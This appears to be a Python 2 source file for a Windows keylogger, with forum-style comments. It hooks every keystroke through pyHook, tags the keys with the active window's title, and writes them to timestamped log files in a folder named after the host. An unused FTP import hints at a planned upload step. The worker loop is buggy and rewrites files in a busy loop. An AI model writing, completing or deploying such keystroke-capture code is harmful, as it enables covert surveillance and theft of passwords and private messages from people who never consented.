import win32api
import win32console
import win32gui
import pythoncom, pyHook , sys, time , os , threading
import shutil ,socket ,datetime
from ftplib import FTP
from threading import Thread 

def OnKeyboardEvent(event):

    # Now you can access your hookmanager, and change which keys you want 
    # to watch. Using 'event' and 'hm', you can do some fun stuff in here.
    global hm
    global lastWindow

    window=win32gui.GetWindowText(win32gui.GetForegroundWindow())      
    ####window = event.WindowName
    ####I'm not sure, but these last two functions may not return the "exact" 
    ####name values. I would call the same function you trying to compare against.

    key = chr(event.Ascii)
    if window != lastWindow:   ## Now you know these at least come from same function
        start = '-----------------------------------'
        print str(start)
        print window 
        lastWindow = window
    print key

def fi():    #This is your "worker loop"
   while True:
        dr =  socket.gethostname()
        if not os.path.exists(dr):
                os.makedirs(dr)
        else:
                pass
        now = datetime.datetime.now()
        p = now.strftime("%Y-%m-%d %H-%M")
        temp_path = dr + '/' + p
        fil =  temp_path + '.txt'
        sys.stdout = open(fil,'w')
        statinfo = os.stat(fil)
        fils = statinfo.st_size
        if(fils > 20):
            now = datetime.datetime.now()
            p = now.strftime("%Y-%m-%d %H-%M")
            temp_path = dr + '/' + p
            fil =  temp_path + '.txt'
            sys.stdout = open(fil,'w')  
        else:
            pass

if __name__ == '__main__':
    """This stuff only executes once"""

    global lastWindow
    lastWindow = None
    lastWindow=win32gui.GetWindowText(win32gui.GetForegroundWindow())
    print lastWindow

    global hm      #if we make this global, we can access inside OnKeyboardEvent
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()

    Thread(target = fi).start() #This is your worker loop

    # We don't need this. OnKeyboardEvent will get callbacks from system
    # thanks to Hookmanager and PumpMessages
    ##Thread(target = OnKeyboardEvent(event)).start()

    # You wouldn't want to do it with the way we are set up, but this is a "polite"
    # way to get PumpMessages to return...

    #ctypes.windll.user32.PostQuitMessage(0) # stops pumpMessages


    try:
        pythoncom.PumpMessages()   #This call will block forever unless interrupted

    except (KeyboardInterrupt, SystemExit) as e: #We will exit cleanly if we are told
        print(e)    
        os._exit()